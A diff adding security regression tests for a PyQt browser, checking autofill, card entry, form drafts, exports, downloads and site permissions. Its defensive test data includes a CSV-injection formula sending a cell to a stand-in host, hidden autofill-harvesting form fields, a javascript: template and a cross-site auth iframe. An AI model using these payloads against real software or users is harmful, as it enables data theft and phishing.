@@ -248,7 +248,40 @@ srv = H.Server({
     "/repo/blob/main/README.md": "<title>gh</title><nav id=site>menu</nav>"
                                  "<article id=readme><h1>Hi</h1></article>",
     "/timers": "<title>t</title><script>window.ticks=0;"
-                "setInterval(function(){window.ticks++},20)</script>"})
+                "setInterval(function(){window.ticks++},20)</script>",
+    "/drive-torrent": "<title>dt</title><script>"
+                      "location.href='/files/thing.torrent'</script>",
+    "/drive-meta": "<title>dm</title><meta http-equiv=refresh "
+                   "content='0;url=/files/meta.torrent'>",
+    "/twhome": "<title>tw</title><p>home</p>",
+    "/twother": "<title>other</title><p id=other>somewhere else</p>",
+    "/sneaky": "<title>s</title><form>"
+               "<input id=full name=fullname autocomplete=name>"
+               "<input id=mail name=email type=email>"
+               "<input id=street name=street autocomplete=street-address "
+               "style='position:absolute;left:-9999px'>"
+               "<input id=tel name=phone type=tel style='opacity:0'>"
+               "<input id=zip name=zip autocomplete=postal-code "
+               "style='width:1px;height:1px;padding:0;border:0'>"
+               "<div style='height:0;overflow:hidden'>"
+               "<input id=city name=city autocomplete=address-level2></div>"
+               "<div style='opacity:0'><input id=country name=country "
+               "autocomplete=country-name></div>"
+               "</form>",
+    "/checkout2": "<title>c2</title><form>"
+                  "<textarea id=msg></textarea>"
+                  "<input id=num name=cardnumber>"
+                  "<input name=cvc placeholder=CVC>"
+                  "<label for=ib>IBAN</label><input id=ib>"
+                  "<input name=otp_code>"
+                  "<textarea class=t1></textarea>"
+                  "<textarea class=t2></textarea></form>",
+    "/auth/panel": "<title>panel</title><p>you are in</p>",
+    "/imgauth": "<title>i</title><p>a page with a frame</p><script>"
+                "var i=document.createElement('iframe');"
+                "i.src=location.protocol+'//localhost:'"
+                "+location.port+'/auth/panel';"
+                "document.body.appendChild(i)</script>"})
 br = B.Browser()
 br.show()
 H.spin(300)
@@ -584,6 +617,351 @@ for _f in (_a, _b):
         _Path(_f).unlink()
     except OSError:
         pass
+
+# a page cannot hand an address to another program by itself: a script's
+# location.href or a meta refresh to a .torrent has to be asked about
+_handed, _asked, _answer = [], [], [False]
+br._torrent_program = lambda: "/bin/true"
+br._ts3_program = lambda: "/bin/true"
+br.torrent_handoff = lambda u: (_handed.append(str(u)), True)[1]
+br.ts3_open = lambda u: (_handed.append(str(u)), True)[1]
+br._ask_handoff = lambda kind, target, site: (
+    _asked.append((kind, site)), _answer[0])[1]
+br.config["handoffSites"] = {}
+v7 = br.new_tab(); H.spin(300)
+H.load(v7, srv.url("/drive-torrent")); H.spin(1200)
+check("a script's .torrent does not start the torrent client by itself",
+      not _handed, str(_handed))
+check("...the page has to ask",
+      _asked == [("torrent", "127.0.0.1")], str(_asked))
+del _asked[:]
+_answer[0] = True
+H.load(v7, srv.url("/drive-torrent")); H.spin(1200)
+check("a yes hands it over",
+      len(_handed) == 1 and _handed[0].endswith("/files/thing.torrent"),
+      str(_handed))
+check("...and is not remembered without the tick",
+      not br.config.get("handoffSites"), str(br.config.get("handoffSites")))
+del _handed[:], _asked[:]
+_answer[0] = False
+br.config["handoffSites"] = {"torrent@127.0.0.1": True}
+H.load(v7, srv.url("/drive-meta")); H.spin(2000)
+check("a site he always allows is not asked again",
+      len(_handed) == 1 and not _asked, str((_handed, _asked)))
+br.config["handoffSites"] = {}
+del _handed[:], _asked[:]
+v7.load(B.QUrl(srv.url("/files/typed.torrent"))); H.spin(1000)
+check("an address the browser itself loads is not asked about",
+      len(_handed) == 1 and not _asked, str((_handed, _asked)))
+for _name in ("_torrent_program", "_ts3_program", "torrent_handoff",
+              "ts3_open", "_ask_handoff"):
+    br.__dict__.pop(_name, None)
+
+# the multistream grid is built once, not over every later page
+br.MULTISTREAM_HOME = srv.url("/twhome")
+v9 = br.multistream(["abcd"])
+H.wait_for(lambda: H.js(v9, "document.querySelectorAll('iframe').length")
+           == 1, 6000)
+check("multistream builds its grid",
+      H.js(v9, "document.querySelectorAll('iframe').length") == 1)
+check("...embedded for the page it is built on",
+      "parent=127.0.0.1" in str(H.js(v9, "document.querySelector('iframe')"
+                                         ".src")))
+H.load(v9, srv.url("/twother")); H.spin(1200)
+check("the next page in that tab is left as it is",
+      H.js(v9, "!!document.getElementById('other') && "
+               "document.querySelectorAll('iframe').length === 0"))
+
+# a host that only contains discord.com is not Discord
+check("subdomain counts as the host", br._host_is("ptb.discord.com",
+                                                   "discord.com"))
+check("a look-alike host does not",
+      not br._host_is("notdiscord.com", "discord.com")
+      and not br._host_is("discord.com.example.net", "discord.com"))
+br.config["discordRoute"] = True
+v10 = br.new_tab(); H.spin(300)
+H.load(v10, srv.url("/twhome")); H.spin(600)
+check("a link to x127.0.0.1.invalid is not routed into the 127.0.0.1 tab",
+      br.discord_route("http://x127.0.0.1.invalid/", host="127.0.0.1")
+      is False)
+br.config["discordRoute"] = False
+
+# an address fill goes only into boxes he can see
+v11 = br.new_tab(); H.spin(300)
+H.load(v11, srv.url("/sneaky")); H.spin(600)
+_got = []
+br.form_tool("fillident", view=v11, then=_got.append, arg={
+    "fullname": "Ada Tester", "email": "ada@example.com",
+    "phone": "+49 30 1", "street": "Teststr. 5", "city": "Berlin",
+    "zip": "10115", "country": "Germany"})
+H.wait_for(lambda: _got, 4000)
+_vals = H.js(v11, "JSON.stringify(['full','mail','street','tel','zip','city',"
+                  "'country'].map(function(i){return document"
+                  ".getElementById(i).value}))")
+check("the boxes he can see are filled",
+      _vals and '"Ada Tester","ada@example.com"' in _vals, _vals)
+check("off-screen, see-through, 1px and clipped boxes stay empty",
+      _vals and _vals.endswith('"","","","",""]'), _vals)
+
+# a card is not typed into a page that sends it in the clear
+check("https is a place for a card",
+      br._card_safe_url("https://shop.example/pay"))
+check("this machine is too", br._card_safe_url("http://127.0.0.1:8000/")
+      and br._card_safe_url("http://localhost/"))
+check("plain http elsewhere is not",
+      not br._card_safe_url("http://shop.example/pay"))
+_said = []
+_flash = br.flash
+br.flash = lambda text, *a, **k: _said.append(str(text))
+v12 = br.new_tab(); H.spin(300)
+v12.load(B.QUrl("http://shop.invalid/pay")); H.spin(1500)
+br.fill_card(view=v12, cvv="1")
+br.flash = _flash
+check("filling a card there is refused, and says why",
+      _said == [br._ui_str("cardInsecure")], str(_said))
+
+# a form draft never keeps a card number, a security code, an IBAN or a
+# one-time code, and it goes back into the box it came from
+import json as _json
+br.config["formDraftsOn"] = True
+v13 = br.new_tab(); H.spin(300)
+H.load(v13, srv.url("/checkout2")); H.spin(600)
+H.js(v13, "document.getElementById('msg').value='Long message here';"
+          "document.getElementById('num').value='4111111111111111';"
+          "document.querySelector('[name=cvc]').value='987';"
+          "document.getElementById('ib').value='DE89370400440532013000';"
+          "document.querySelector('[name=otp_code]').value='654321';"
+          "document.querySelector('.t2').value='second box';")
+_saved = []
+br.save_form_draft(view=v13, then=_saved.append)
+H.wait_for(lambda: _saved, 4000)
+_disk = _json.dumps(br.config.get("formDrafts"))
+check("the draft keeps the message", "Long message here" in _disk, _disk)
+check("...but no card number, code, IBAN or one-time code",
+      not any(x in _disk for x in ("4111111111111111", '"987"',
+                                   "DE89370400440532013000", "654321")),
+      _disk)
+H.load(v13, srv.url("/checkout2")); H.spin(1200)
+_back = []
+br.restore_form_draft(view=v13, then=_back.append)
+H.wait_for(lambda: _back, 4000)
+H.spin(200)
+check("a box with no name gets its own text back, not its neighbour's",
+      H.js(v13, "document.querySelector('.t1').value") == ""
+      and H.js(v13, "document.querySelector('.t2').value") == "second box",
+      str((H.js(v13, "document.querySelector('.t1').value"),
+           H.js(v13, "document.querySelector('.t2').value"))))
+br.config["formDrafts"] = {"shop.example/pay": {"when": 1, "rows": [
+    {"key": "#cardnumber", "value": "4111"},
+    {"key": "input[name=otp_code]", "value": "1"},
+    {"key": "#msg", "value": "keep me"}]}}
+br.config["formHistory"] = {"shop.example": {"cvc": ["123"],
+                                             "city": ["Berlin"]}}
+br._scrub_secret_rows()
+check("drafts already on disk lose their card rows",
+      br.config["formDrafts"]["shop.example/pay"]["rows"]
+      == [{"key": "#msg", "value": "keep me"}],
+      str(br.config["formDrafts"]))
+check("...and the form history its codes",
+      br.config["formHistory"] == {"shop.example": {"city": ["Berlin"]}},
+      str(br.config["formHistory"]))
+br.config["formDrafts"] = {}
+br.config["formHistory"] = {}
+
+# an http login box belongs to the page in the tab, not to a picture
+# another site pulled in from that host
+_asked_auth = []
+_real_get = B.QInputDialog.getText
+B.QInputDialog.getText = staticmethod(
+    lambda *a, **k: (_asked_auth.append(1), ("", False))[1])
+_pw_was = br.config.get(B.VAULT_PASSWORD_KEY, True)
+br.config[B.VAULT_PASSWORD_KEY] = True
+br.vault.set_entry("localhost", "http", "ada", "letmein")
+br._auth_tried = {}
+v14 = br.new_tab(); H.spin(300)
+H.load(v14, srv.url("/imgauth")); H.spin(2000)
+check("another site's frame gets no saved login",
+      not any("/auth/" in k for k in br._auth_tried), str(br._auth_tried))
+check("...and puts up no dialog", _asked_auth == [], str(_asked_auth))
+H.load(v14, srv.url("/auth/panel", host="localhost"))
+H.wait_for(lambda: "you are in" in (H.js(v14, "document.body.innerText")
+                                    or ""), 8000)
+check("the tab's own page still gets the saved login, with no dialog",
+      "you are in" in (H.js(v14, "document.body.innerText") or "")
+      and _asked_auth == [],
+      str(((H.js(v14, "document.body.innerText") or "")[:30], _asked_auth)))
+B.QInputDialog.getText = _real_get
+br.config[B.VAULT_PASSWORD_KEY] = _pw_was
+
+# exported tables carry no cell a spreadsheet would run
+import csv as _csv
+_xdir = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
+br.export_history(str(_xdir / "h.csv"), "csv", rows=[
+    {"t": 0, "title": '=WEBSERVICE("http://x.invalid/?"&C2)',
+     "url": "https://a.example/", "s": "main"}])
+_cells = list(_csv.reader(open(str(_xdir / "h.csv"), encoding="utf-8")))
+check("history export: a page title cannot be a formula",
+      _cells[1][1].startswith("'="), str(_cells))
+_dl_was = list(br.downloads)
+br.downloads[:] = [{"id": "x", "name": "+cmd.csv", "url": "https://a/",
+                    "from": "", "size": 1, "t": 0, "state": "done"}]
+br.export_downloads(str(_xdir / "d.csv"))
+br.downloads[:] = _dl_was
+_cells = list(_csv.reader(open(str(_xdir / "d.csv"), encoding="utf-8")))
+check("downloads export: a file name cannot be a formula",
+      _cells[1][0] == "'+cmd.csv", str(_cells))
+
+# opening a downloaded .jar runs it (Java takes it from xdg-open): asked
+# first, from the downloads page's Open as much as from the menu
+(_xdir / "mod.jar").write_bytes(b"PK not really")
+_dl_was = list(br.downloads)
+br.downloads[:] = [{"id": 991, "name": "mod.jar", "dir": str(_xdir),
+                    "url": "https://a/", "t": 0, "state": "done"}]
+_q, _opened = [], []
+_real_q = B.QMessageBox.question
+_real_open = B.QDesktopServices.openUrl
+_real_popen = B.subprocess.Popen
+B.QMessageBox.question = staticmethod(
+    lambda *a, **k: (_q.append(1), B.QMessageBox.StandardButton.No)[1])
+B.QDesktopServices.openUrl = staticmethod(lambda u: _opened.append(u))
+B.subprocess.Popen = lambda *a, **k: _opened.append(a)
+br.open_download(991)
+br.open_download_file(991)
+B.QMessageBox.question = _real_q
+B.QDesktopServices.openUrl = _real_open
+B.subprocess.Popen = _real_popen
+br.downloads[:] = _dl_was
+check("a downloaded .jar is not run without a yes, from either Open",
+      _q == [1, 1] and _opened == [], str((_q, _opened)))
+
+# taking files out of an archive never writes over his own
+import zipfile as _zf
+(_xdir / "readme.txt").write_text("mine")
+with _zf.ZipFile(str(_xdir / "pack.zip"), "w") as z:
+    z.writestr("inner/readme.txt", "theirs")
+_one = br.archive_file(str(_xdir / "pack.zip"), "inner/readme.txt")
+check("one file out of an archive leaves the file already there alone",
+      (_xdir / "readme.txt").read_text() == "mine" and _one
+      and _Path(_one).read_text() == "theirs", str(_one))
+_first = br.extract_archive(path=str(_xdir / "pack.zip"), ask=False)
+(_Path(_first) / "inner" / "readme.txt").write_text("edited by him")
+_second = br.extract_archive(path=str(_xdir / "pack.zip"), ask=False)
+check("unpacking again goes into a new folder, not over his edits",
+      _second and _second != _first
+      and (_Path(_first) / "inner" / "readme.txt").read_text()
+      == "edited by him", str((_first, _second)))
+
+# "strip metadata" strips it: no comment, no XMP with a GPS position
+_img = B.QImage(8, 8, B.QImage.Format.Format_RGB32)
+_img.fill(B.QColor("red"))
+_img.setText("Comment", "secret-comment")
+_img.setText("XML:com.adobe.xmp", "<x><exif:GPSLatitude>52,31.0N"
+             "</exif:GPSLatitude></x>")
+_img.save(str(_xdir / "snap.png"), "PNG")
+_png = br.strip_metadata(str(_xdir / "snap.png"))
+_jpg = br.strip_metadata(str(_xdir / "snap.png"), into="jpg")
+_back = B.QImage(_png)
+check("stripped picture: no text keys left",
+      _png and _back.textKeys() == [], str(_back.textKeys()))
+check("...and none written into a JPEG either",
+      _jpg and b"GPSLatitude" not in open(_jpg, "rb").read()
+      and b"secret-comment" not in open(_jpg, "rb").read())
+check("...with the same pixels", _back.pixelColor(3, 3) == B.QColor("red"),
+      str(_back.pixelColor(3, 3).name()))
+check("a PNG with only a text chunk counts as carrying metadata",
+      br.image_has_metadata(str(_xdir / "snap.png")))
+check("...and the stripped copy as carrying none",
+      not br.image_has_metadata(_png))
+(_xdir / "pic.png").write_bytes(b"his own picture")
+_img.save(str(_xdir / "pic.bmp"), "BMP")
+_conv = br.convert_image(str(_xdir / "pic.bmp"), into="png")
+check("converting never replaces a file already there",
+      (_xdir / "pic.png").read_bytes() == b"his own picture"
+      and _conv and _conv != str(_xdir / "pic.png"), str(_conv))
+
+# yt-dlp finishes even when it talks a lot, and a private tab's video
+# is not written into the downloads list
+import os as _os, stat as _stat
+_bin = _xdir / "bin"
+_bin.mkdir()
+(_bin / "yt-dlp").write_text("#!/bin/sh\nhead -c 300000 /dev/zero "
+                             "| tr '\\0' x\nexit 0\n")
+(_bin / "yt-dlp").chmod(0o755)
+_path_was = _os.environ.get("PATH", "")
+_os.environ["PATH"] = str(_bin) + ":" + _path_was
+br.config["downloadDir"] = str(_xdir)
+_said_dl = []
+br.save_with_ytdlp(url="https://video.example/v", view=v14,
+                   then=_said_dl.append)
+H.wait_for(lambda: _said_dl, 15000)
+check("a chatty yt-dlp still finishes", _said_dl == ["done"], str(_said_dl))
+_pv = br.new_private_tab(); H.spin(400)
+_rows_before = len(br.downloads)
+_said_dl2 = []
+br.save_with_ytdlp(url="https://video.example/secret", view=_pv,
+                   then=_said_dl2.append)
+H.wait_for(lambda: _said_dl2, 15000)
+check("a private tab's video leaves no row in the downloads list",
+      len(br.downloads) == _rows_before
+      and not any("secret" in str(e.get("url")) for e in br.downloads),
+      str(len(br.downloads) - _rows_before))
+_os.environ["PATH"] = _path_was
+
+# saving a page as a file never replaces one already there, and a
+# private tab's page is saved without a row in the list
+br.config["downloadDir"] = str(_xdir)
+(_xdir / "other.md").write_text("his own notes")
+v15 = br.new_tab(); H.spin(300)
+H.load(v15, srv.url("/twother")); H.spin(600)
+_md = []
+br.save_page_markdown(view=v15, then=_md.append)
+H.wait_for(lambda: _md, 6000)
+check("a saved page does not replace his file of the same name",
+      (_xdir / "other.md").read_text() == "his own notes" and _md
+      and _md[0].endswith("other (1).md"), str(_md))
+H.load(_pv, srv.url("/twother")); H.spin(800)
+_rows_before = len(br.downloads)
+_md2 = []
+br.save_page_markdown(view=_pv, then=_md2.append)
+H.wait_for(lambda: _md2, 6000)
+check("a private tab's saved page is not written into the list",
+      _md2 and _md2[0] and len(br.downloads) == _rows_before,
+      str((_md2, len(br.downloads) - _rows_before)))
+
+# the address bar's "whole address" tooltip shows the address, not what
+# its decoded letters spell out as markup
+_long = ("https://e.example/" + "x" * 300
+         + "%3Ch1%3Ehttps://bank.example%3C/h1%3E")
+br.show_address(_long)
+_tip = br.urlbar.toolTip()
+from PyQt6.QtGui import QTextDocument as _QTD
+_doc = _QTD()
+_doc.setHtml(_tip)
+check("the long-address tooltip is plain text",
+      "<h1>https://bank.example</h1>" in _doc.toPlainText()
+      and "<h1>" not in _tip, _tip[-80:])
+check("an empty tooltip stays empty", B.literal("") == "")
+
+# the lock menu lists this site's permissions, not every site whose
+# name contains this one's
+_perm_was = br.config.get("permissions")
+br.config["permissions"] = {"http://127.0.0.1:1|camera": "allow",
+                            "https://x127.0.0.1.example|mic": "allow"}
+_facts = br.site_info(v15)
+check("site info: only this host's grants",
+      list(_facts.get("permissions", {})) == ["http://127.0.0.1:1|camera"],
+      str(_facts.get("permissions")))
+br.config["permissions"] = _perm_was
+
+# a site's search template is a web address or nothing
+check("a javascript: search template is refused",
+      br.note_opensearch("evil.example", "x",
+                         "javascript:alert(1)//{searchTerms}") is False
+      and "evil.example" not in br.opensearch_table())
+check("an https one is kept",
+      br.note_opensearch("good.example", "g",
+                         "https://good.example/?q={searchTerms}") is True)
+br.opensearch_table().pop("good.example", None)
 
 bad = [n for ok, n in RESULTS if not ok]
 print("%d checks, %d failed" % (len(RESULTS), len(bad)))
